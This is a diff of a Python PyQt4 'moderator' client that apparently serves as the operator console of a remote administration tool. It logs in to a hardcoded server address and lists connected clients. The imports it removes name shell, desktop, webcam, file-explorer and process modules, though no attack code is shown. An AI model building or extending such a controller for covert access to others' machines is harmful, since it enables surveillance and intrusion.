@@ -1,11 +1,7 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import socket
 import os
-import time
-import threading
-import hashlib
 import string
 import random
 
@@ -13,26 +9,25 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
 from ModeratorFactory import *
-from libs import pygeoip
+
 from libs.language import Translate
+from libs.gui import tables, main
 from ui import gui
-from LogViewer import LogViewer
-from libs.log_settings import LogSettings
-from libs.settings import Config, Settings
-from libs.data_transfer import data_receive, data_send, data_get
-from modules.mexplorer import main as mexplorer
-from modules.mshell import main as mshell
-from modules.mprocesses import main as mprocesses
-from modules.mscript import main as mscript
-from modules.mdesktop import main as mdesktop
-from modules.mwebcam import main as mwebcam
 
 SERVER_HOST = '109.172.189.74'
+#SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 1313
+
+
+# Initial Folders
+assets = os.path.join(os.path.dirname(sys.argv[0]), 'assets')
+flags = os.path.join(assets, 'flags')
+plugins = os.path.join(os.path.dirname(sys.argv[0]), 'plugins')
 
 # Multi Lang
 translate = Translate()
 _ = lambda _word: translate.word(_word)
+
 
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
@@ -46,48 +41,54 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # Create Protocol
         self.create_moderator()
+        # Create Tables UI
+        self.tables = tables.updateClientsTable(self, assets)
+        # Create Main UI Functions
+        self.ui = main.updateUi(self)
 
         # Init Modes
         self.modes = {
             'moderatorInitializing': self.moderatorInitializing,
+            'getClients': self.getClients,
         }
-
-        # Triggers
-        self.connectButton.clicked.connect(self.on_connect_to_server)
 
     def create_moderator(self):
         self.moderator = SocketModeratorFactory(
-            self.on_client_connect_success,
-            self.on_client_connect_fail,
-            self.on_client_receive)
+            self.on_moderator_connect_success,
+            self.on_moderator_connect_fail,
+            self.on_moderator_receive)
 
-
+    # Start Connect To Server
     def on_connect_to_server(self):
-
         self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)
 
-    def on_client_connect_success(self):
+    # Connected To Server
+    def on_moderator_connect_success(self):
         self.session_id = id_generator(size=24)
         username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'), QLineEdit.Normal)
         if ok:
             password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
             if ok:
-                self.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing', self.session_id)
+                self.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing', session_id=self.session_id)
+            else:
+                self.main.on_moderator_connected()
+        else:
+            self.main.on_moderator_not_connected()
 
-    def on_client_connect_fail(self, reason):
+    # Disconnected From Server
+    def on_moderator_connect_fail(self, reason):
+        self.connection.close()
         # reason is a twisted.python.failure.Failure  object
         print 'cann\'t connect. reason: %s' % reason
 
     # Callbacks
-    def on_client_receive(self, data):
+    def on_moderator_receive(self, data):
         if type(data) is dict:
             if self.modes.has_key(data['mode']):
                 self.modes[data['mode']](data)
+            # TODO: DEBUG
             else:
                 print 'UNKNOWN MODE [%s]' % data['mode']
-
-    def send_to_server(self, message):
-        self.moderator.send_msg(message)
 
     # CALLBACKS
     # Moderator Login Callback
@@ -96,57 +97,42 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if data['payload'].startswith('loginSuccess '):
             # Get Privileges
             self.privs = int(data['payload'].split()[-1])
-            if self.privs == 1: self.enable_administrator()
-            else: self.disable_administrator()
+            if self.privs == 1: self.ui.enable_administrator()
+            else: self.ui.disable_administrator()
             # Start Client Checker
             self.clients_checker = QTimer()
             self.clients_checker.timeout.connect(self.check_clients)
-            self.clients_checker.start(3)
+            self.clients_checker.start(500)
             # Update UI
-            self.on_moderator_connected()
+            self.ui.on_moderator_connected()
         else:
             # Update UI
-            self.on_moderator_not_connected()
+            self.ui.on_moderator_not_connected()
             # Warn Message
             warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
             ans = warn.exec_()
 
+    def getClients(self, data):
+        '''
+        Update Clients Information
+        :param data:
+        :return:
+        '''
+        self.tables.update_clients(data)
 
-    # Ui Functions
-    # Moderator Connected Succes
-    def on_moderator_connected(self):
-        self.loginStatusLabel.setText(self.session_id)
-        self.loginStatusLabel.setStyleSheet('color: #2ecc71')
-        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/connection.png")))
-        self.connectButton.setChecked(True)
+    # get online client
+    def current_client(self):
+        try:
+            return str(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_id).text())
+        except AttributeError:
+            return False
 
-    # Moderator Connected Error
-    # TODO: style
-    def on_moderator_not_connected(self):
-        self.loginStatusLabel.setText('Not Connected')
-        self.loginStatusLabel.setStyleSheet('color: red')
-        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/no_connection.png")))
-        self.connectButton.setChecked(False)
-
-    # Enable Administrators Features
-    def enable_administrator(self):
-        # Online Clients Moderators
-        self.clientsTable.showColumn(0)
-        # Offline Clients Moderators
-        self.offlineClientsTable.showColumn(0)
-        # Moderators Tab
-        self.clientsTabs.setTabEnabled(2, True)
-        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/moderators.png")))
-
-    # Disable Administrators Features
-    def disable_administrator(self):
-        # Online Clients Moderators
-        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
-        # Offline Clients Moderators
-        self.offlineClientsTable.setColumnHidden(0, True)
-        # Moderators Tab
-        self.clientsTabs.setTabEnabled(2, False)
-        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/none.png")))
+    # get offline client
+    def current_offline_client(self):
+        try:
+            return str(self.offlineClientsTable.item(self.offlineClientsTable.currentRow(), 2).text())
+        except AttributeError:
+            return False
 
     # Check Clients For Updates
     def check_clients(self):
